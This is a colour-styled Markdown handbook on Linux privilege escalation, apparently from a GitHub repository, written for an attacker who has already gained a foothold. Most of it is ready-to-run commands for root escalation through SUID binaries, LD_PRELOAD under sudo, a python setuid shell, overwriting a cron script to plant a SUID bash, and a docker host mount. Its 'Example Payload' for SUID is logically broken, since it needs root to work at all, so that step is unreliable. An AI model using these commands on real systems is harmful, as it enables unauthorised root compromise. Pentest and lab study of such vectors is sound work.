<!-- Colorful Linux PrivEsc Handbook -->

<div style="background:#0f172a;padding:20px;border-radius:8px;color:#e2e8f0;">
<h1 style="color:#38bdf8;">🧠 Linux Privilege Escalation Handbook</h1>

<p style="color:#a5b4fc;">A complete, color-enhanced reference guide for Linux PrivEsc with styled sections for GitHub.</p>
</div>

---

## <div style="color:#38bdf8;">📌 Table of Contents</div>

<div style="background:#0b1120;padding:15px;border-radius:6px;color:#cbd5e1;">
1. <a href="#introduction" style="color:#7dd3fc;">Introduction</a><br>
2. <a href="#enumeration" style="color:#7dd3fc;">Post-Compromise Enumeration</a><br>
3. <a href="#suid" style="color:#7dd3fc;">SUID / GUID Binaries</a><br>
4. <a href="#sudo" style="color:#7dd3fc;">Sudo Misconfigurations</a><br>
5. <a href="#capabilities" style="color:#7dd3fc;">Capabilities & File Capabilities</a><br>
6. <a href="#cron" style="color:#7dd3fc;">Cron Jobs & Scheduled Tasks</a><br>
7. <a href="#nfs" style="color:#7dd3fc;">Misconfigured NFS Shares</a><br>
8. <a href="#kernel" style="color:#7dd3fc;">Kernel Exploits & PrivEsc</a><br>
9. <a href="#docker" style="color:#7dd3fc;">Containers, Docker, LXC Escalation</a><br>
10. <a href="#network" style="color:#7dd3fc;">Network & Pivoting Vectors</a><br>
11. <a href="#checklist" style="color:#7dd3fc;">Summary & Checklist</a>
</div>

---

## <div id="introduction" style="color:#38bdf8;">🔹 Introduction</div>

<div style="background:#0b1120;padding:18px;border-radius:6px;color:#cbd5e1;">
Once you gain access to a Linux machine, **privilege escalation** becomes the primary goal.
This handbook documents every major PrivEsc vector with practical commands.
</div>

---

## <div id="enumeration" style="color:#38bdf8;">🔹 Post-Compromise Enumeration</div>

<div style="background:#1e293b;padding:18px;border-radius:6px;color:#e2e8f0;">
<h3 style="color:#7dd3fc;">Key Commands</h3>

```
hostname
uname -a
cat /proc/version
cat /etc/issue
ps aux
ps axjf
env
sudo -l
ls -la /home
id
ifconfig || ip a
netstat -lntp
find / -perm -u=s -type f 2>/dev/null
```

<h3 style="color:#7dd3fc;">What to Look For</h3>

- OS, kernel, architecture  
- Users + groups  
- SUID binaries  
- Writable files & weak permissions  
- Sudo permissions  
- Cron jobs  
- Misconfigured services (Docker, NFS)  
- Network services & pivot points  
</div>

---

## <div id="suid" style="color:#38bdf8;">🔹 SUID / GUID Binaries</div>

<div style="background:#1e1b4b;padding:18px;border-radius:6px;color:#e2e8f0;">
<h3 style="color:#c084fc;">Understanding SUID</h3>
SUID makes binaries run with the owner’s privileges (usually root).

<h3 style="color:#c084fc;">Enumeration</h3>
```
find / -type f -perm -4000 -ls 2>/dev/null
```

<h3 style="color:#c084fc;">Exploitation</h3>
- Binaries with shell escape (vim, less, find)<br>
- PATH Hijacking<br>
- Custom malicious binaries<br>

<h3 style="color:#c084fc;">Example Payload</h3>
```
chmod +s /usr/bin/vim
vim /etc/shadow
```
</div>

---

## <div id="sudo" style="color:#38bdf8;">🔹 Sudo Misconfigurations</div>

<div style="background:#0f172a;padding:18px;border-radius:6px;color:#e2e8f0;">
<h3 style="color:#93c5fd;">Check Sudo Permissions</h3>
```
sudo -l
```

<h3 style="color:#93c5fd;">Dangerous Misconfigs</h3>
- NOPASSWD  
- LD_PRELOAD allowed  
- PATH manipulation  
- Running interpreters (python, perl, ruby)  

<h3 style="color:#93c5fd;">LD_PRELOAD Exploit</h3>
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=./shell.so find
```

GTFOBins reference:<br>
<a href="https://gtfobins.github.io/#sudo" style="color:#7dd3fc;">https://gtfobins.github.io/#sudo</a>
</div>

---

## <div id="capabilities" style="color:#38bdf8;">🔹 Capabilities & File Capabilities</div>

<div style="background:#1e293b;padding:18px;border-radius:6px;color:#cbd5e1;">
Capabilities grant special privileges without full root.

<h3 style="color:#7dd3fc;">Find Capabilities</h3>
```
getcap -r / 2>/dev/null
```

<h3 style="color:#7dd3fc;">Exploit Example</h3>
```
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
</div>

---

## <div id="cron" style="color:#38bdf8;">🔹 Cron Jobs & Scheduled Tasks</div>

<div style="background:#0b1120;padding:18px;border-radius:6px;color:#e2e8f0;">
Cron jobs running as root with writable scripts = easy PrivEsc.

<h3 style="color:#7dd3fc;">Enumeration</h3>
```
cat /etc/crontab
ls -la /etc/cron.*
crontab -l -u root
```

<h3 style="color:#7dd3fc;">Exploit</h3>
```
echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' > /home/user/backup.sh
```
</div>

---

## <div id="nfs" style="color:#38bdf8;">🔹 Misconfigured NFS Shares</div>

<div style="background:#1e1b4b;padding:18px;border-radius:6px;color:#e2e8f0;">
`no_root_squash` = remote root privileges.

<h3 style="color:#c084fc;">Identify Vulnerable Exports</h3>
```
showmount -e <TARGET>
```

<h3 style="color:#c084fc;">Exploit</h3>
Mount share, drop SUID binary, execute on target.
</div>

---

## <div id="kernel" style="color:#38bdf8;">🔹 Kernel Exploits</div>

<div style="background:#0f172a;padding:18px;border-radius:6px;color:#e2e8f0;">
<h3 style="color:#93c5fd;">Check Kernel</h3>
```
uname -a
```

<h3 style="color:#93c5fd;">Exploit</h3>
Use public exploits: DirtyCow, OverlayFS, DirtyPipe.
</div>

---

## <div id="docker" style="color:#38bdf8;">🔹 Docker/LXC Escalation</div>

<div style="background:#0b1120;padding:18px;border-radius:6px;color:#cbd5e1;">
If user is in docker group → root access on host.

```
docker run -v /:/host -it alpine chroot /host sh
```
</div>

---

## <div id="network" style="color:#38bdf8;">🔹 Network & Pivoting</div>

<div style="background:#1e293b;padding:18px;border-radius:6px;color:#e2e8f0;">
```
netstat -lntp
ss -lntu
route -n
```
Network misconfigs can lead to lateral movement.
</div>

---

## <div id="checklist" style="color:#38bdf8;">📝 Summary & Checklist</div>

<div style="background:#0f172a;padding:18px;border-radius:6px;color:#e2e8f0;">
- SUID binaries  
- Sudo misconfigs  
- Cron jobs  
- NFS  
- Capabilities  
- Docker  
- Kernel exploits  
- Writable scripts  
- Weak permissions  
</div>

---

<div style="background:#0b1120;padding:10px;border-radius:6px;color:#94a3b8;">
Generated: Color-enhanced Linux PrivEsc Handbook (HTML inside Markdown)
</div>
